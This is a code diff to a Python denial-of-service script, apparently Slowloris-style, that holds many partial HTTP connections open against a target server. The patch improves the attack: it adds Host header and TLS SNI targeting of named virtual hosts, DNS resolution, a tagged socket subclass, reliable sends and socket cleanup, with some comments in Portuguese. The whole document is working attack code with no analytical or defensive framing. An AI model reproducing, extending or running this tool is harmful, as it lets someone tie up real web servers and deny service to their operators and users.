@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import csv
+import ipaddress
 import logging
 import os
 import random
@@ -61,12 +62,18 @@ parser.add_argument(
     help="Use HTTPS for the requests",
 )
 parser.add_argument(
+    "--host",
+    default=None,
+    help="Host header / TLS SNI value. Defaults to the URL. Use this when the "
+         "URL is an IP but the vhost you want is named.",
+)
+parser.add_argument(
     "-d",
     "--delay",
     dest="delay",
     default=15,
     type=int,
-    help="Delay in seconds between each request, defaults to 5 seconds.",
+    help="Delay in seconds between each request, defaults to 15 seconds.",
 )
 parser.add_argument(
     "--csv",
@@ -189,6 +196,20 @@ if args.useproxy:
         logging.error("Socks Proxy Library Not Available!")
         sys.exit(1)
 
+# socket.socket é um tipo C com __slots__: instâncias não têm __dict__ e não
+# aceitam atributos. Faz subclass do que estiver em vigor (builtin, ou
+# socks.socksocket sob proxy) e rebind, para que todo ponto de alocação use a
+# subclasse.
+_BaseSocket = socket.socket
+
+
+class TaggedSocket(_BaseSocket):
+    """Socket com __dict__, para pendurar estado por conexão."""
+    pass
+
+
+socket.socket = TaggedSocket
+
 # Logging: root at DEBUG so the CSV handler sees everything, console filtered.
 _root = logging.getLogger()
 _root.setLevel(logging.DEBUG)
@@ -207,7 +228,7 @@ if csv_handler:
 # Linha a enviar.
 def send_line(self, line):
     line = f"{line}\r\n"
-    self.send(line.encode("utf-8"))
+    self.sendall(line.encode("utf-8"))
 
 
 # Header a enviar.
@@ -256,18 +277,50 @@ setattr(socket.socket, "send_line", send_line)
 setattr(socket.socket, "send_header", send_header)
 
 
+def is_ip(host):
+    try:
+        ipaddress.ip_address(host)
+        return True
+    except ValueError:
+        return False
+
+
+def resolve(host, port):
+    """Resolve host to an address literal. Returns (ip, family)."""
+    try:
+        ipaddress.ip_address(host)
+        return host, socket.AF_INET6 if ":" in host else socket.AF_INET
+    except ValueError:
+        pass
+
+    infos = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
+    if not infos:
+        raise socket.gaierror(f"no addresses for {host}")
+    # Prefere IPv4, para um host dual-stack não cair num endereço v6 inalcançável.
+    infos.sort(key=lambda i: i[0] != socket.AF_INET)
+    family, _, _, _, sockaddr = infos[0]
+    return sockaddr[0], family
+
+
 # Cria a primeira iteração das sockets
-def init_socket(ip: str, sid: str = ""):
+def init_socket(ip: str, sid: str = "", host: str = "", family: int = socket.AF_INET):
     t0 = time.monotonic()
-    log_event("connect_start", level=logging.DEBUG, socket_id=sid, target=f"{ip}:{args.port}")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    log_event(
+        "connect_start",
+        level=logging.DEBUG,
+        socket_id=sid,
+        target=f"{ip}:{args.port}",
+        host=host,
+    )
+    s = socket.socket(family, socket.SOCK_STREAM)
     s.settimeout(4)
 
     if args.https:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=args.url)
+        # Um IP literal não envia extensão SNI, então passa None nesses casos.
+        s = ctx.wrap_socket(s, server_hostname=None if is_ip(host) else host)
 
     try:
         s.connect((ip, args.port))
@@ -279,9 +332,17 @@ def init_socket(ip: str, sid: str = ""):
             error=type(e).__name__,
             elapsed_ms=f"{(time.monotonic() - t0) * 1000:.1f}",
         )
+        try:
+            s.close()
+        except OSError:
+            pass
         raise
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+
+    default_port = 443 if args.https else 80
+    host_header = host if args.port == default_port else f"{host}:{args.port}"
+    s.send_header("Host", host_header)
 
     ua = user_agents[0]
     if args.randuseragent:
@@ -297,6 +358,15 @@ def init_socket(ip: str, sid: str = ""):
         elapsed_ms=f"{(time.monotonic() - t0) * 1000:.1f}",
     )
     return s
+
+
+_target_ip = None
+_target_host = None
+_target_family = socket.AF_INET
+
+
+def new_socket(sid):
+    return init_socket(_target_ip, sid, _target_host, _target_family)
 
 
 # Iterações futuras das sockets.
@@ -315,6 +385,10 @@ def iterations():
                 error=type(e).__name__,
             )
             list_of_sockets.remove(s)
+            try:
+                s.close()
+            except OSError:
+                pass
 
     diff = args.sockets - len(list_of_sockets)
     if diff <= 0:
@@ -324,7 +398,7 @@ def iterations():
     for i in range(diff):
         sid = f"r{i:04d}"
         try:
-            s = init_socket(args.url, sid)
+            s = new_socket(sid)
             if not s:
                 continue
             s._sid = sid
@@ -336,20 +410,35 @@ def iterations():
 
 # Função main
 def main():
-    ip = args.url
+    global _target_ip, _target_host, _target_family
+
+    _target_host = args.host or args.url
     socket_count = args.sockets
+
+    if args.useproxy:
+        # SOCKS5 resolve remotamente; mantém o nome para o DNS do lado do proxy.
+        _target_ip, _target_family = args.url, socket.AF_INET
+    else:
+        try:
+            _target_ip, _target_family = resolve(args.url, args.port)
+        except socket.gaierror as e:
+            logging.error("Could not resolve %s: %s", args.url, e)
+            sys.exit(1)
+
+    ip = _target_ip
     if csv_handler:
         log_event("csv_log_opened", path=csv_handler.path)
     log_event(
         "start",
         target=ip,
+        host=_target_host,
         port=args.port,
         sockets=socket_count,
         delay_s=args.delay,
         tls=args.https,
         proxy=args.useproxy,
     )
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+    logging.info("Attacking %s (%s) with %s sockets.", _target_host, ip, socket_count)
 
     logging.info("Creating Sockets...")
     t_start = time.monotonic()
@@ -357,7 +446,7 @@ def main():
         sid = f"s{i:04d}"
         try:
             logging.debug("Creating Socket #%s", i)
-            s = init_socket(ip, sid)
+            s = new_socket(sid)
         except socket.error as e:
             logging.debug(e)
             break
